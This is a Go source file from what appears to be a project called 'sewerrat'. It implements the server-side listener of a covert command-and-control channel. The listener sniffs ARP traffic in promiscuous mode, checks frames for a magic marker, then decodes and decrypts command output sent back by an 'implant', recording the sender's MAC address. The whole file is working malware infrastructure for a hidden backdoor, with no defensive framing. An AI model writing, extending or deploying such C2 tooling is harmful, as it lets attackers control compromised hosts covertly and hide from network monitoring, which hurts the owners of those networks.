package server

import (
	"fmt"
	"log"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
	"sewerrat/shared"
)

// ResponseListener sniffs for ARP responses containing command output
type ResponseListener struct {
	interfaceName string
	handle        *pcap.Handle
	responseCh    chan ARPResponse
}

// ARPResponse represents a decoded response from the implant
type ARPResponse struct {
	SourceMAC string
	Data      string
	Timestamp time.Time
}

// NewResponseListener creates a new response listener
func NewResponseListener(interfaceName string) (*ResponseListener, error) {
	handle, err := pcap.OpenLive(interfaceName, 1600, true, pcap.BlockForever)
	if err != nil {
		return nil, fmt.Errorf("failed to open interface: %w", err)
	}

	// Set BPF filter to ARP only
	if err := handle.SetBPFFilter("arp"); err != nil {
		handle.Close()
		return nil, fmt.Errorf("failed to set BPF filter: %w", err)
	}

	return &ResponseListener{
		interfaceName: interfaceName,
		handle:        handle,
		responseCh:    make(chan ARPResponse, 10),
	}, nil
}

// Start begins listening for responses (blocking)
func (rl *ResponseListener) Start() error {
	if rl.handle == nil {
		return fmt.Errorf("device not open")
	}

	packetSource := gopacket.NewPacketSource(rl.handle, rl.handle.LinkType())
	packetSource.NoCopy = true

	for packet := range packetSource.Packets() {
		rl.processPacket(packet)
	}

	return nil
}

// StartAsync begins listening in a separate goroutine
func (rl *ResponseListener) StartAsync() error {
	go func() {
		if err := rl.Start(); err != nil {
			log.Printf("[!] Listener error: %v\n", err)
		}
	}()
	return nil
}

// GetResponseChannel returns the channel for receiving responses
func (rl *ResponseListener) GetResponseChannel() <-chan ARPResponse {
	return rl.responseCh
}

// processPacket checks for C2 traffic and decodes response
func (rl *ResponseListener) processPacket(packet gopacket.Packet) {
	frameData := packet.Data()

	// Check for magic marker
	if !shared.ValidateMagicMarker(frameData) {
		return // Not C2 traffic
	}

	// Decode payload
	data, err := shared.PayloadDecode(frameData, false)
	if err != nil {
		return
	}

	// Try decryption if enabled
	decrypted, err := shared.SafeDecrypt([]byte(data))
	if err != nil {
		decrypted = []byte(data)
	}

	// Extract source MAC from ARP layer (offset 6-11 in ARP packet)
	var sourceMAC string
	if len(frameData) > 17 {
		sourceMAC = fmt.Sprintf("%02x:%02x:%02x:%02x:%02x:%02x",
			frameData[8], frameData[9], frameData[10],
			frameData[11], frameData[12], frameData[13])
	}

	// Send response
	select {
	case rl.responseCh <- ARPResponse{
		SourceMAC: sourceMAC,
		Data:      string(decrypted),
		Timestamp: time.Now(),
	}:
		// Response queued
	default:
		log.Printf("[!] Response channel full\n")
	}
}

// Stop gracefully closes the listener
func (rl *ResponseListener) Stop() error {
	if rl.handle != nil {
		rl.handle.Close()
	}
	close(rl.responseCh)
	return nil
}

// WaitForResponse waits for a response with timeout
func (rl *ResponseListener) WaitForResponse(timeout time.Duration) (*ARPResponse, error) {
	select {
	case resp := <-rl.responseCh:
		return &resp, nil
	case <-time.After(timeout):
		return nil, fmt.Errorf("response timeout")
	}
}
